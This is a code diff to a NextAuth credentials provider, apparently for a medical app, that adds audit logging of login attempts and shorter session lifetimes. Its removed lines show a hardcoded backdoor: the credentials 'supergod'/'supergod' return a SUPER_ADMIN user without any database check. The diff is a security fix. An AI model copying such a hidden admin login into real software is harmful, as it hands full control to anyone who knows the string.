@@ -2,6 +2,7 @@ import NextAuth from "next-auth";
 import CredentialsProvider from "next-auth/providers/credentials";
 import prisma from "@/lib/prisma";
 import bcrypt from "bcrypt";
+import { auditLog, AuditEvents } from "@/lib/audit-log";
 
 export const authOptions = {
     providers: [
@@ -14,26 +15,23 @@ export const authOptions = {
             async authorize(credentials) {
                 if (!credentials?.email || !credentials?.password) return null;
 
-                if (credentials.email === 'supergod' && credentials.password === 'supergod') {
-                    return {
-                        id: '9999999',
-                        email: 'supergod',
-                        name: 'Super Admin',
-                        collegeName: 'System',
-                        role: 'SUPER_ADMIN',
-                        status: 'APPROVED',
-                    };
-                }
-
                 const user = await prisma.user.findUnique({
                     where: { email: credentials.email }
                 });
 
-                if (!user) return null;
+                if (!user) {
+                    auditLog(AuditEvents.LOGIN_FAILURE, { email: credentials.email, reason: 'user_not_found' });
+                    return null;
+                }
 
                 const isPasswordValid = await bcrypt.compare(credentials.password, user.password);
 
-                if (!isPasswordValid) return null;
+                if (!isPasswordValid) {
+                    auditLog(AuditEvents.LOGIN_FAILURE, { email: credentials.email, reason: 'invalid_password' });
+                    return null;
+                }
+
+                auditLog(AuditEvents.LOGIN_SUCCESS, { userId: user.id, email: user.email, role: user.role });
 
                 // Return user with role and status for session
                 return {
@@ -49,6 +47,8 @@ export const authOptions = {
     ],
     session: {
         strategy: "jwt",
+        maxAge: 8 * 60 * 60,     // 8 hours — appropriate for medical app
+        updateAge: 60 * 60,       // Refresh token every hour
     },
     callbacks: {
         async jwt({ token, user }) {
